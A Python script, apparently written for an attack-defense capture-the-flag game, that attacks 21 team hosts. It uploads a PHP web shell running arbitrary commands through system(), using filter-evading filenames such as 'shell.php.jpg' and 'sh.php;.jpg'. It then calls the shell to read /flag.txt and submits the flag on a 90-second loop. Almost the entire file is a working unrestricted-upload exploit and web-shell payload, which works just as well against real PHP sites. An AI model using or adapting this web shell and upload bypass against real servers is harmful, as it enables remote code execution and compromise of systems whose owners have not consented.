import requests, time
from flag_sender import extract_flag, send_flag

N_EQUIPOS = 21
targets = [f'10.66.{i}.4' for i in range(1, N_EQUIPOS + 1)]
port = 8080

WEB_SHELL = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>"

EVASIVE_FILENAMES = [
    ("shell.php", "application/x-php"),
    ("shell.php.jpg", "image/jpeg"),
    ("shell.pHp", "text/plain"),
    ("sh.php;.jpg", "image/jpeg"),
]

SHELL_PATHS = [
    "/uploads/shell.php",
    "/images/shell.php",
    "/upload/shell.php",
]

def try_upload(ip):
    upload_url = f"http://{ip}:{port}/upload.php"
    for name, mime in EVASIVE_FILENAMES:
        files = {"file": (name, WEB_SHELL, mime)}
        try:
            r = requests.post(upload_url, files=files, timeout=8, allow_redirects=True)
            if r.status_code in (200, 302):
                return True
        except Exception:
            continue
    return False

def try_exec(ip):
    for path in SHELL_PATHS:
        shell_url = f"http://{ip}:{port}{path}"
        try:
            r = requests.get(shell_url, params={"cmd": "cat /flag.txt"}, timeout=6) #cambiar ruta de ser necesario
            if r.status_code == 200 and "CDM_" in r.text:
                return extract_flag(r.text)
        except Exception:
            continue
    return None

def main():
    while True:
        for ip in targets:
            print(f"[+] Probando {ip}:{port}")
            if try_upload(ip):
                flag = try_exec(ip)
                if flag:
                    print(f"[+] Flag encontrada en {ip}: {flag}")
                    print(send_flag(flag))
                else:
                    print(f"[-] No se encontró flag en {ip}")
            else:
                print(f"[-] Falló la subida en {ip}")
        time.sleep(90)

if __name__ == "__main__":
    main()